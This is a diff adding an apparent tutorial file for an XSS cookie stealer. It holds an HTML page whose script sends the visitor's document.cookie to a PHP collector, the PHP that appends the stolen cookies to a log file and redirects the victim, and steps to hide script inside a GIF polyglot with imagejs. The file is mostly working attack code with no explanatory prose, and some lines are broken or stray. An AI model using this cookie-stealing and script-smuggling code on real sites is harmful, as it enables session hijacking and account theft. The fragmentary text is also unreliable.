@@ -1,0 +1,48 @@
+XSS Cookie Stealer in JavaScript to Steal Passwords
+mkdir cookiestealer
+cd cookiestealer
+touch index.html
+nano index.html
+
+<html>
+<body>
+<script type="text/javascript">document.cookie = "username=Null Byte";</script>
+<script type="text/javascript">
+document.cookie = "username=Null Byte";
+document.write(document.cookie);
+</script>
+<script type="text/javascript">
+document.location='http://127.0.0.1/cookiestealer.php?c='+document.cookie;
+</script>
+
+</body>
+</html>
+
+nano cookiestealer.php
+
+<?php
+header ('Location:https://google.com');
+$cookies = $_GET["c"];
+$file = fopen('log.txt', 'a');
+fwrite($file, $cookies . "\n\n");
+?>
+
+php -S 127.0.0.1:80
+
+cat log.txt
+
+<script>alert("Alert");</script>
+
+git clone https://github.com/jklmnn/imagejs.git
+cd imagejs
+make
+window.alert("Null Byte");
+echo "window.alert("Null Byte");" > script.js
+./imagejs gif script.js -i image.gif
+
+<html>
+<body>
+<img src="script.js.gif">
+<script src="script.js.gif"></script>
+</body>
+</html>
